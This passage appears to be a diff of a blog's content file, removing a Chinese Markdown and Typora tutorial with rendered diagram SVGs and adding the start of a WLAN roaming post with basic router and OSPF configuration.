-<h2 id="Markdown介绍"><a href="#Markdown介绍" class="headerlink" title="Markdown介绍"></a>Markdown介绍</h2><p>Markdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档。<br>Markdown 语言在 2004 由约翰·格鲁伯（英语：John Gruber）创建。<br>Markdown 编写的文档可以导出 HTML 、Word、图像、PDF、Epub 等多种格式的文档。<br>Markdown 编写的文档后缀为 .md, .markdown。</p>
-<h2 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h2><p>加粗： Ctrl + B			字体倾斜：Ctrl+I			      下划线 ：Ctrl+U</p>
-<p>插入链接：Ctrl + K 		   	创建表格：Ctrl+T</p>
-<p>行内代码：Ctrl + Shift + K	  插入图片：Ctrl + Shift + I	   	     插入图片：Ctrl+Shift+M</p>
-<p>选中某句话：Ctrl+L 		  选中某个单词： Ctrl+D	        搜索：Ctrl+F </p>
-<p>搜索并替换：Ctrl+H		选中相同格式的文字：Ctrl+E        删除线：Alt+Shift+5 </p>
-<p>撤销： Ctrl + Z			返回Typora顶部：Ctrl+Home     返回Typora底部：Ctrl+End    </p>
-<p>公式块：Ctrl+Shift+I  		     引用：Ctrl+Shift+Q          </p>
-<p>标题： Ctrl + 1（一级标题）；Ctrl + 2（二级标题） – 以此类推</p>
-<h2 id="引用文字"><a href="#引用文字" class="headerlink" title="引用文字"></a>引用文字</h2><p>Markdown 使用电子邮件样式&gt;字符进行块引用。它们表示为：</p>
-<pre class="language-none"><code class="language-none">&gt; 这是一个有两段的块引用。这是第一段。
-&gt;
-&gt; 这是第二段。Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.
-
-
-
-&gt; 这是另一个只有一个段落的块引用。有三个空行分隔两个块引用。</code></pre>
-
-<p>在typora中，只需输入’&gt;’后跟引用内容即可生成块引用。Typora将为您插入正确的“&gt;”或换行符。通过添加额外级别的“&gt;”允许在块引用内嵌入另一个块引用。</p>
-<h2 id="元素列表"><a href="#元素列表" class="headerlink" title="元素列表"></a>元素列表</h2><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><p>使用 *   +   -  都可以创建一个无序列表</p>
-<pre class="language-none"><code class="language-none">* AAA
-+ BBB
-- CCC</code></pre>
-
-<h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><p>使用 1. 2. 3. 创建有序列表</p>
-<pre class="language-none"><code class="language-none">1. AAA
-2. BBB
-3. CCC</code></pre>
-
-<h3 id="任务列表"><a href="#任务列表" class="headerlink" title="任务列表"></a>任务列表</h3><p>任务列表是标记为[ ]或[x]（未完成或完成）的项目的列表。例如：</p>
-<pre class="language-none"><code class="language-none">- [ ] 这是一个任务列表项
-- [ ] 需要在前面使用列表的语法
-- [ ] normal **formatting**, @mentions, #1234 refs
-- [ ] 未完成
-- [x] 完成</code></pre>
-
-<p>您可以通过单击项目前面的复选框来更改完成&#x2F;未完成状态。</p>
-<h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><p>在Typora中插入程序代码的方式有两种：使用反引号 &#96;（~ 键）、使用缩进（Tab）。</p>
-<ul>
-<li><p>插入行内代码，即插入一个单词或者一句代码的情况，使用 <code>code</code> 这样的形式插入。</p>
-</li>
-<li><p>插入多行代码输入3个反引号（&#96;） + 回车，并在后面选择一个语言名称即可实现语法高亮。</p>
-</li>
-</ul>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hell oword"</span><span class="token punctuation">)</span></code></pre>
-
-<h2 id="数学公式块"><a href="#数学公式块" class="headerlink" title="数学公式块"></a>数学公式块</h2><p>您可以使用 MathJax 渲染 LaTeX 数学表达式。</p>
-<p>输入 $$, 然后按“return”键将触发一个接受Tex &#x2F; LaTex源代码的输入区域。以下是一个例子： </p>
-<p><img src="https://s3.bmp.ovh/imgs/2022/03/33ed0e61febfaa79.png" loading="lazy"></p>
-<p>在 markdown 源文件中，数学公式块是由’$$’标记包装的 LaTeX 表达式：</p>
-<pre class="language-none"><code class="language-none">$$
-\mathbf&#123;V&#125;_1 \times \mathbf&#123;V&#125;_2 &#x3D;  \begin&#123;vmatrix&#125; 
-\mathbf&#123;i&#125; &amp; \mathbf&#123;j&#125; &amp; \mathbf&#123;k&#125; \\
-\frac&#123;\partial X&#125;&#123;\partial u&#125; &amp;  \frac&#123;\partial Y&#125;&#123;\partial u&#125; &amp; 0 \\
-\frac&#123;\partial X&#125;&#123;\partial v&#125; &amp;  \frac&#123;\partial Y&#125;&#123;\partial v&#125; &amp; 0 \\
-\end&#123;vmatrix&#125;
-$$</code></pre>
-
-<p>LeTeX表达式参考连接：<a href="https://blog.csdn.net/ViatorSun/article/details/82826664#:~:text=%E7%9A%84LaTex%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%BA%20%24x_i%5E2%24%20%E3%80%82.%20LaTex%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%AD%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%A0%87%E5%8F%AF%E4%BB%A5%E5%8F%A0%E5%8A%A0%E7%9A%84%EF%BC%8C%E5%B0%B1%E6%AF%94%E5%A6%82.%20x%20%20y%20,x_%20%7B2i%7D%5E%20%7B2%2Bb%7D.%20x2i2%2Bb.%20%E2%80%8B.%20%E7%9A%84LaTex%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%BA%24x_%20%7B2i%7D%5E%20%7B2%2Bb%7D%24%E3%80%82.">超详细 LaTex数学公式</a>   <a href="https://blog.csdn.net/weixin_39679367/article/details/84729452">LaTeX：公式常用字符和表达式</a></p>
-<h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><p>输入 <code>| First Header | Second Header |</code> 并按下 <code>return</code> 键将创建一个包含两列的表。</p>
-<p>创建表后，焦点在该表上将弹出一个表格工具栏，您可以在其中调整表格，对齐或删除表格。您还可以使用上下文菜单来复制和添加&#x2F;删除列&#x2F;行。</p>
-<p>可以跳过以下描述，因为表格的 markdown 源代码是由typora自动生成的。</p>
-<p>在 markdown 源代码中，它们看起来像这样：</p>
-<pre class="language-none"><code class="language-none">| First Header  | Second Header |
-| ------------- | ------------- |
-| Content Cell  | Content Cell  |
-| Content Cell  | Content Cell  |</code></pre>
-
-<p>您还可以在表格中包括内联 Markdown 语法，例如链接，粗体，斜体或删除线。</p>
-<ul>
-<li>不管是哪种方式，第一行为表头，第二行为分割表头和主体部分，第三行开始每一行为一个表格行</li>
-<li>列与列之间用管道符号<code>|</code> 隔开</li>
-<li>还可设置对齐方式(表头与内容之间)，如果不使用对齐标记，内容默认左对齐，表头居中对齐<ul>
-<li>左对齐 ：|</li>
-<li>右对齐 |：</li>
-<li>中对齐 ：|：</li>
-</ul>
-</li>
-<li>为了美观，可以使用空格对齐不同行的单元格，并在左右两侧都使用 | 来标记单元格边界</li>
-<li>为了使 Markdown 更清晰，| 和 - 两侧需要至少有一个空格（最左侧和最右侧的 | 外就不需要了）</li>
-</ul>
-<h2 id="脚注"><a href="#脚注" class="headerlink" title="脚注"></a>脚注</h2><pre class="language-none"><code class="language-none">您可以像这样创建脚注[^footnote].
-
-[^footnote]: Here is the *text* of the **footnote**.</code></pre>
-
-<p>将产生：</p>
-<p>您可以像这样创建脚注<a href="https://support.typoraio.cn/zh/Markdown-Reference/#fn:footnote">1</a>.</p>
-<p>鼠标移动到‘footnote’上标中查看脚注的内容。</p>
-<h2 id="水平线"><a href="#水平线" class="headerlink" title="水平线"></a>水平线</h2><p>输入 <code>***</code> 或 <code>---</code> 在空行上按 <code>return</code> 键将绘制一条水平线。</p>
-<h2 id="目录-TOC"><a href="#目录-TOC" class="headerlink" title="目录 (TOC)"></a>目录 (TOC)</h2><p>输入 <code>[toc]</code> 然后按 <code>Return</code> 键将创建一个“目录”部分，自动从文档内容中提取所有标题，其内容会自动更新。</p>
-<h2 id="上下标"><a href="#上下标" class="headerlink" title="上下标"></a>上下标</h2><h3 id="上标"><a href="#上标" class="headerlink" title="上标"></a>上标</h3><p>可以使用<code>&lt;sup&gt;文本&lt;/sup&gt;</code>实现上标。</p>
-<p>(需在设置中打开该功能)</p>
-<p>X<sup>2</sup></p>
-<h3 id="下标"><a href="#下标" class="headerlink" title="下标"></a>下标</h3><p>可以使用 <code>&lt;sub&gt;文本&lt;/sub&gt;</code>实现下标。</p>
-<p>(需在设置中打开该功能)</p>
-<p>H<sub>2</sub>O</p>
-<h2 id="文本居中"><a href="#文本居中" class="headerlink" title="文本居中"></a>文本居中</h2><p>使用 <code>&lt;center&gt;这是要居中的内容&lt;/center&gt;</code>可以使文本居中</p>
-<center>这是要居中的文本内容</center>
-
-
-
-<h2 id="Span-元素"><a href="#Span-元素" class="headerlink" title="Span 元素"></a>Span 元素</h2><p>在您输入后Span元素会被立即解析并呈现。在这些span元素上移动光标会将这些元素扩展为markdown源代码。以下将解释这些span元素的语法。</p>
-<h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>Markdown 支持两种类型的链接：内联和引用。</p>
-<p>在这两种样式中，链接文本都写在[方括号]内。</p>
-<p>要创建内联链接，请在链接文本的结束方括号后立即使用一组常规括号。在常规括号内，输入URL地址，以及可选的用引号括起来的链接标题。例如：</p>
-<pre class="language-none"><code class="language-none">This is [an example](http:&#x2F;&#x2F;example.com&#x2F; &quot;Title&quot;) inline link.
-
-[This link](http:&#x2F;&#x2F;example.net&#x2F;) has no title attribute.</code></pre>
-
-<p>将产生：</p>
-<p>This is <a href="http://example.com/%22Title%22">an example</a> inline link. (<code>&lt;p&gt;This is &lt;a href=&quot;http://example.com/&quot; title=&quot;Title&quot;&gt;</code>)</p>
-<p><a href="http://example.net/">This link</a> has no title attribute. (<code>&lt;p&gt;&lt;a href=&quot;http://example.net/&quot;&gt;This link&lt;/a&gt; has no</code>)</p>
-<h4 id="内部链接"><a href="#内部链接" class="headerlink" title="内部链接"></a>内部链接</h4><p><strong>您可以将常规括号内的 href 设置为文档内的某一个标题</strong>，这将创建一个书签，允许您在单击后跳转到该部分。例如：</p>
-<p>Command(在Windows上：Ctrl) + 单击 <a href="https://support.typoraio.cn/zh/Markdown-Reference/#%E5%9D%97%E5%85%83%E7%B4%A0">此链接</a> 将跳转到标题 <code>块元素</code>处。 要查看如何编写，请移动光标或按住 <code>⌘</code> 键单击以将元素展开为 Markdown 源代码。</p>
-<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>参考样式链接使用第二组方括号，在其中放置您选择的标签以标识链接：</p>
-<pre class="language-none"><code class="language-none">This is [an example][id] reference-style link.
-
-然后，在文档中的任何位置，您可以单独定义链接标签，如下所示：
-
-[id]: http:&#x2F;&#x2F;example.com&#x2F;  &quot;Optional Title Here&quot;</code></pre>
-
-<p>在typora中，它们将呈现为：</p>
-<p>This is <a href="http://example.com/">an example</a> reference-style link.</p>
-<p>隐式链接名称快捷方式允许您省略链接的名称，在这种情况下，链接文本本身将用作名称。只需使用一组空的方括号，例如，将“Google”一词链接到google.com网站，您只需写下：</p>
-<pre class="language-none"><code class="language-none">[Google][]
-然后定义链接：
-
-[Google]: http:&#x2F;&#x2F;google.com&#x2F;</code></pre>
-
-<p>在typora中单击链接将其展开以进行编辑，command + 单击将在 Web 浏览器中打开超链接。</p>
-<h3 id="URL网址"><a href="#URL网址" class="headerlink" title="URL网址"></a>URL网址</h3><p>Typora允许您将 URL 作为链接插入，用 <code>&lt;</code>括号括起来<code>&gt;</code>。</p>
-<p><code>&lt;i@typora.io&gt;</code> 成为 <a href="mailto:i@typora.io">i@typora.io</a>.</p>
-<p>Typora也将自动链接标准URL。例如： <a href="http://www.google.com/">www.google.com</a>.</p>
-<h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><p>图像与链接类似， 但在链接语法之前需要添加额外的 <code>!</code> 字符。 图像语法如下所示：</p>
-<pre class="language-none"><code class="language-none">![替代文字](&#x2F;path&#x2F;to&#x2F;img.jpg)
-
-![替代文字](&#x2F;path&#x2F;to&#x2F;img.jpg &quot;可选标题&quot;)</code></pre>
-
-<p>您可以使用拖放操作从图像文件或浏览器来插入图像。并通过单击图像修改 markdown 源代码。如果图像在拖放时与当前编辑文档位于同一目录或子目录中，则将使用相对路径。</p>
-<h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p>教程来自知乎：<a href="https://zhuanlan.zhihu.com/p/40810821">https://zhuanlan.zhihu.com/p/40810821</a></p>
-<p>Typora可以直接在markdown中画流程图，而且语法简洁易懂</p>
-<ul>
-<li>sequence</li>
-</ul>
-<p>语言选择sequence即可生成流程图</p>
-<pre class="language-none"><code class="language-none">李雷 -&gt; 韩梅梅: Hello 梅梅, How are you?
-Note right of 韩梅梅: 韩梅梅心想
-韩梅梅 --&gt; 李雷: I&#39;m fine, thanks, and you?</code></pre>
-
-<svg width="460.78125" height="247.416" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="overflow: hidden; position: relative; left: -0.0336056px; top: -0.972681px; max-width: 100%; height: auto;" version="1.1">
- <desc style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">Created with Raphaël 2.2.0</desc>
- <defs style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
-  <path style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" id="raphael-marker-block" d="m5,0l-5,2.5l5,2.5l0,-5z" stroke-linecap="round"/>
-  <marker style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" refY="2.5" refX="2.5" orient="auto" markerWidth="5" markerHeight="5" id="raphael-marker-endblock55-objehh4q">
-   <use id="svg_1" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="currentColor" transform="rotate(180 2.5,2.5) scale(1) " xlink:href="#raphael-marker-block"/>
-  </marker>
-  <marker style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" refY="2.5" refX="2.5" orient="auto" markerWidth="5" markerHeight="5" id="raphael-marker-endblock55-objo2myt">
-   <use id="svg_2" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="currentColor" transform="rotate(180 2.5,2.5) scale(1) " xlink:href="#raphael-marker-block"/>
-  </marker>
- </defs>
- <g>
-  <title>background</title>
-  <rect fill="none" id="canvas_background" height="619" width="1292" y="-1" x="-1"/>
- </g>
- <g>
-  <title>Layer 1</title>
-  <rect id="svg_3" stroke-width="2" stroke="currentColor" fill="none" height="35.484375" width="52.28125" y="20" x="10"/>
-  <rect id="svg_4" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="none" height="15.484375" width="32.28125" y="30" x="20"/>
-  <text id="svg_5" fill="currentColor" font-size="16px" font-family="Andale Mono, monospace" text-anchor="middle" y="37.742188" x="36.140625">
-   <tspan id="svg_6" dy="5.71875">李雷</tspan>
-  </text>
-  <rect id="svg_7" stroke-width="2" stroke="currentColor" fill="none" height="35.484375" width="52.28125" y="191.9375" x="10"/>
-  <rect id="svg_8" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="none" height="15.484375" width="32.28125" y="201.9375" x="20"/>
-  <text id="svg_9" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); text-anchor: middle; font-family: "Andale Mono", monospace; font-size: 16px;" fill="currentColor" font-size="16px" font-family="Andale Mono, monospace" text-anchor="middle" y="209.679688" x="36.140625">
-   <tspan id="svg_10" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" dy="5.71875">李雷</tspan>
-  </text>
-  <path id="svg_11" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" stroke-width="2" d="m36.14063,55.48438l0,136.45312" stroke="currentColor" fill="var(--bg-color)"/>
-  <rect id="svg_12" stroke-width="2" stroke="currentColor" fill="none" height="35.484375" width="68.40625" y="20" x="231.6875"/>
-  <rect id="svg_13" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="none" height="15.484375" width="48.40625" y="30" x="241.6875"/>
-  <text id="svg_14" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); text-anchor: middle; font-family: "Andale Mono", monospace; font-size: 16px;" fill="currentColor" font-size="16px" font-family="Andale Mono, monospace" text-anchor="middle" y="37.742188" x="265.890625">
-   <tspan id="svg_15" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" dy="5.71875">韩梅梅</tspan>
-  </text>
-  <rect id="svg_16" stroke-width="2" stroke="currentColor" fill="none" height="35.484375" width="68.40625" y="191.9375" x="231.6875"/>
-  <rect id="svg_17" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="none" height="15.484375" width="48.40625" y="201.9375" x="241.6875"/>
-  <text id="svg_18" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); text-anchor: middle; font-family: "Andale Mono", monospace; font-size: 16px;" fill="currentColor" font-size="16px" font-family="Andale Mono, monospace" text-anchor="middle" y="209.679688" x="265.890625">
-   <tspan id="svg_19" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" dy="5.71875">韩梅梅</tspan>
-  </text>
-  <path id="svg_20" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" stroke-width="2" d="m265.89063,55.48438l0,136.45312" stroke="currentColor" fill="var(--bg-color)"/>
-  <rect id="svg_21" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="none" height="15.484375" width="193.625" y="72.734375" x="54.203125"/>
-  <text id="svg_22" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); text-anchor: middle; font-family: "Andale Mono", monospace; font-size: 16px;" fill="currentColor" font-size="16px" font-family="Andale Mono, monospace" text-anchor="middle" y="80.484375" x="151.015625">
-   <tspan id="svg_23" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" dy="5.710938">Hello 梅梅, How are you?</tspan>
-  </text>
-  <path id="svg_24" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" marker-end="url(#raphael-marker-endblock55-objehh4q)" stroke-width="2" d="m36.14063,90.96875c0,0 191.19018,0 224.75115,0" stroke="currentColor" fill="var(--bg-color)"/>
-  <rect id="svg_25" stroke-width="2" stroke="currentColor" fill="none" height="25.484375" width="90.6875" y="110.96875" x="285.890625"/>
-  <rect id="svg_26" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="none" height="15.484375" width="80.6875" y="115.96875" x="290.890625"/>
-  <text id="svg_27" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); text-anchor: middle; font-family: "Andale Mono", monospace; font-size: 16px;" fill="currentColor" font-size="16px" font-family="Andale Mono, monospace" text-anchor="middle" y="123.710938" x="331.234375">
-   <tspan id="svg_28" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" dy="5.71875">韩梅梅心想</tspan>
-  </text>
-  <rect id="svg_29" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="none" height="15.484375" width="209.75" y="153.703125" x="46.140625"/>
-  <text id="svg_30" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); text-anchor: middle; font-family: "Andale Mono", monospace; font-size: 16px;" fill="currentColor" font-size="16px" font-family="Andale Mono, monospace" text-anchor="middle" y="161.453125" x="151.015625">
-   <tspan id="svg_31" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" dy="5.710938">I'm fine, thanks, and you?</tspan>
-  </text>
-  <path id="svg_32" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" stroke-dasharray="6,2" marker-end="url(#raphael-marker-endblock55-objo2myt)" stroke-width="2" d="m265.89063,171.9375c0,0 -191.19019,0 -224.75116,0" stroke="currentColor" fill="var(--bg-color)"/>
- </g>
-</svg>
-
-
-<ul>
-<li>flowchart</li>
-</ul>
-<p>对于Flowchart,语法选择flow</p>
-<pre class="language-none"><code class="language-none">st&#x3D;&gt;start: 闹钟响起
-op&#x3D;&gt;operation: 与床板分离
-cond&#x3D;&gt;condition: 分离成功?
-e&#x3D;&gt;end: 快乐的一天
-
-st-&gt;op-&gt;cond
-cond(yes)-&gt;e
-cond(no)-&gt;op</code></pre>
-
-
-<svg width="175.8203125" height="408.509765625" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid meet" style="overflow: hidden; position: relative; left: -0.0378136px; top: -0.976878px;" version="1.1">
- <desc style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">Created with Raphaël 2.2.0</desc>
- <defs style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
-  <path style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" id="raphael-marker-block" d="m5,0l-5,2.5l5,2.5l0,-5z" stroke-linecap="round"/>
-  <marker style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" refY="1.5" refX="1.5" orient="auto" markerWidth="3" markerHeight="3" id="raphael-marker-endblock33-objrngqv">
-   <use id="svg_1" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="currentColor" stroke-width="1.6667" transform="rotate(180 1.5,1.5) scale(0.6000000238418579) " xlink:href="#raphael-marker-block"/>
-  </marker>
-  <marker style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" refY="1.5" refX="1.5" orient="auto" markerWidth="3" markerHeight="3" id="raphael-marker-endblock33-objfsd5j">
-   <use id="svg_2" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="currentColor" stroke-width="1.6667" transform="rotate(180 1.5,1.5) scale(0.6000000238418579) " xlink:href="#raphael-marker-block"/>
-  </marker>
-  <marker style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" refY="1.5" refX="1.5" orient="auto" markerWidth="3" markerHeight="3" id="raphael-marker-endblock33-obj05jvn">
-   <use id="svg_3" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="currentColor" stroke-width="1.6667" transform="rotate(180 1.5,1.5) scale(0.6000000238418579) " xlink:href="#raphael-marker-block"/>
-  </marker>
-  <marker style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" refY="1.5" refX="1.5" orient="auto" markerWidth="3" markerHeight="3" id="raphael-marker-endblock33-objyoquh">
-   <use id="svg_4" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="currentColor" stroke-width="1.6667" transform="rotate(180 1.5,1.5) scale(0.6000000238418579) " xlink:href="#raphael-marker-block"/>
-  </marker>
- </defs>
- <g>
-  <title>background</title>
-  <rect fill="none" id="canvas_background" height="618" width="517" y="-1" x="-1"/>
- </g>
- <g>
-  <title>Layer 1</title>
-  <rect transform="matrix(1,0,0,1,38.668,23.377) " id="st" class="flowchart" stroke-width="3" stroke="currentColor" fill="none" ry="20" rx="20" height="36.15625" width="76.484375" y="0" x="0"/>
-  <text transform="matrix(1,0,0,1,38.668,23.377) " class="flowchartt" id="stt" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); text-anchor: start; font-family: Arial; font-size: 14px;" fill="currentColor" font-size="14px" font-family=""Arial"" text-anchor="start" y="18.078125" x="10">
-   <tspan id="svg_5" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" dy="4.703125">闹钟响起</tspan>
-  </text>
-  <rect transform="matrix(1,0,0,1,31.6133,132.9102) " id="op" class="flowchart" stroke-width="3" stroke="currentColor" fill="none" height="36.15625" width="90.59375" y="0" x="0"/>
-  <text transform="matrix(1,0,0,1,31.6133,132.9102) " class="flowchartt" id="opt" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); text-anchor: start; font-family: Arial; font-size: 14px;" fill="currentColor" font-size="14px" font-family=""Arial"" text-anchor="start" y="18.078125" x="10">
-   <tspan id="svg_6" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" dy="4.703125">与床板分离</tspan>
-  </text>
-  <path class="flowchart" id="cond" stroke-width="3" d="m41.45508,242.79394l-35.45508,17.72754l70.91016,35.45508l70.91015,-35.45508l-70.91015,-35.45508l-70.91016,35.45508" stroke="currentColor" fill="none"/>
-  <text transform="matrix(1,0,0,1,6,225.0664) " class="flowchartt" id="condt" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); text-anchor: start; font-family: Arial; font-size: 14px;" fill="currentColor" font-size="14px" font-family=""Arial"" text-anchor="start" y="35.455078" x="40.455078">
-   <tspan id="svg_7" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" dy="4.705078">分离成功?</tspan>
-  </text>
-  <rect transform="matrix(1,0,0,1,31.6133,369.3535) " id="e" class="flowchart" stroke-width="3" stroke="currentColor" fill="none" ry="20" rx="20" height="36.15625" width="90.59375" y="0" x="0"/>
-  <text transform="matrix(1,0,0,1,31.6133,369.3535) " class="flowchartt" id="et" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); text-anchor: start; font-family: Arial; font-size: 14px;" fill="currentColor" font-size="14px" font-family=""Arial"" text-anchor="start" y="18.078125" x="10">
-   <tspan id="svg_8" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" dy="4.703125">快乐的一天</tspan>
-  </text>
-  <path id="svg_9" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" marker-end="url(#raphael-marker-endblock33-objrngqv)" stroke-width="3" d="m76.91016,59.5332c0,0 0,52.90527 0,68.86985" stroke="currentColor" fill="none"/>
-  <path id="svg_10" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" marker-end="url(#raphael-marker-endblock33-objfsd5j)" stroke-width="3" d="m76.91016,169.06641c0,0 0,38.20077 0,51.50016" stroke="currentColor" fill="none"/>
-  <path id="svg_11" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" marker-end="url(#raphael-marker-endblock33-obj05jvn)" stroke-width="3" d="m76.91016,295.97656c0,0 0,52.90527 0,68.86985" stroke="currentColor" fill="none"/>
-  <text id="svg_12" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); text-anchor: start; font-family: Arial; font-size: 14px;" fill="currentColor" font-size="14px" font-family=""Arial"" text-anchor="start" y="305.976563" x="81.910156">
-   <tspan id="svg_13" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" dy="4.703125">yes</tspan>
-  </text>
-  <path id="svg_14" marker-end="url(#raphael-marker-endblock33-objyoquh)" stroke-width="3" d="m147.82031,260.52148c0,0 25,-10 25,-10c0,0 0,-152.61132 0,-152.61132c0,0 -95.91015,0 -95.91015,0c0,0 0,21.04307 0,30.49601" stroke="currentColor" fill="none"/>
-  <text id="svg_15" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); text-anchor: start; font-family: Arial; font-size: 14px;" fill="currentColor" font-size="14px" font-family=""Arial"" text-anchor="start" y="250.521484" x="152.820313">
-   <tspan id="svg_16" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" dy="4.708984">no</tspan>
-  </text>
- </g>
-</svg>
-
-
-
-
-<ul>
-<li>gantt</li>
-</ul>
-<p>除了Sequence和Flowchart两类图之外，Mermaid还提供一种叫做gantt的图。插入下面的代码，然后语法选mermaid就会自动渲染成gantt图了。</p>
-<pre class="language-none"><code class="language-none">gantt
-        dateFormat  YYYY-MM-DD
-        title 快乐的生活
-        section 吃一把鸡就学习
-        学习            :done,    des1, 2014-01-06,2014-01-09
-        疯狂学习               :active,  des2, 2014-01-09, 3d
-        继续疯狂学习               :         des3, after des2, 5d
-        吃鸡！               :         des4, after des3, 4d
-        section 具体内容
-        学习Python :crit, done, 2014-01-06,72h
-        学习C++          :crit, done, after des1, 2d
-        学习Lisp             :crit, active, 3d
-        学习图形学        :crit, 4d
-        跳伞           :2d
-        打枪                      :2d
+    <title>WLAN漫游</title>
+    <url>/posts/ba6ef991/</url>
+    <content><![CDATA[<h2 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h2><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615145903.png" alt="image-20220615145902818" loading="lazy"></p>
+<h2 id="配置如下："><a href="#配置如下：" class="headerlink" title="配置如下："></a>配置如下：</h2><h3 id="路由器的配置："><a href="#路由器的配置：" class="headerlink" title="路由器的配置："></a>路由器的配置：</h3><pre class="language-none"><code class="language-none">sys
+sysname LuRen-SW
+int g0&#x2F;0&#x2F;0
+ip add 10.1.1.2 30
+int lo0
+ip add 1.1.1.1 32
+ospf 1
+area 0.0.0.0
+network 1.1.1.1 0.0.0.0
+network 10.1.1.0 0.0.0.3
 </code></pre>
 
-<p><svg id="mermaidChart0" width="100%" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 624 340" height="340" style="max-width: 624px;"><style>#mermaidChart0{font-family:sans-serif;font-size:16px;fill:#333;}#mermaidChart0 .error-icon{fill:#552222;}#mermaidChart0 .error-text{fill:#552222;stroke:#552222;}#mermaidChart0 .edge-thickness-normal{stroke-width:2px;}#mermaidChart0 .edge-thickness-thick{stroke-width:3.5px;}#mermaidChart0 .edge-pattern-solid{stroke-dasharray:0;}#mermaidChart0 .edge-pattern-dashed{stroke-dasharray:3;}#mermaidChart0 .edge-pattern-dotted{stroke-dasharray:2;}#mermaidChart0 .marker{fill:#333333;}#mermaidChart0 .marker.cross{stroke:#333333;}#mermaidChart0 svg{font-family:sans-serif;font-size:16px;}#mermaidChart0 .mermaid-main-font{font-family:”trebuchet ms”,verdana,arial;font-family:var(–mermaid-font-family);}#mermaidChart0 .section{stroke:none;opacity:0.2;}#mermaidChart0 .section0{fill:rgba(102,102,255,0.49);}#mermaidChart0 .section2{fill:#fff400;}#mermaidChart0 .section1,#mermaidChart0 .section3{fill:white;opacity:0.2;}#mermaidChart0 .sectionTitle0{fill:#333;}#mermaidChart0 .sectionTitle1{fill:#333;}#mermaidChart0 